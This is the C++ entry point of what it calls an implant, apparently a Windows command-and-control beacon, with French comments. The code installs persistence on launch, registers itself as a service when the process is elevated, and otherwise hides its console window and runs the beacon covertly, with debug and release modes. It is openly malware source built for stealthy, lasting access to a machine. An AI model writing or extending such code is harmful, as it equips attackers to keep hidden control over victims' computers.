#include "beacon.h"
#include "persistence.h"
#include "service.h"
#include "log.h"
#include <windows.h>
#include <string>

int main(int argc, char** argv) {
    // Mode installation explicite via la ligne de commande
    if (argc > 1 && std::string(argv[1]) == "--install") {
        return install_persistence() ? 0 : 1;
    }

    // 1. Tenter de se connecter au SCM (si lance par le Service Control Manager)
    int res = run_as_service();
    if (res == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        // 2. Si on n'est pas lance par le SCM :
#ifdef NDEBUG
        // En Release : on installe la persistance la plus forte possible.
        // Si elle est elevee, le service prend le relais et ce processus quitte
        // (evite le double beacon). Sinon, le repli utilisateur est installe et
        // l'implant tourne ici, masque, jusqu'au prochain logon.
        const bool elevated = process_is_elevated();
        const bool installed = install_persistence();

        if (installed && elevated) {
            return 0;
        }

        ShowWindow(GetConsoleWindow(), SW_HIDE);
        start_implant();
        return 0;
#else
        // En Debug : on configure la persistance mais on execute l'implant dans
        // la console courante pour afficher les logs en direct.
        install_persistence();
        start_implant();
        return 0;
#endif
    }
    return res;
}
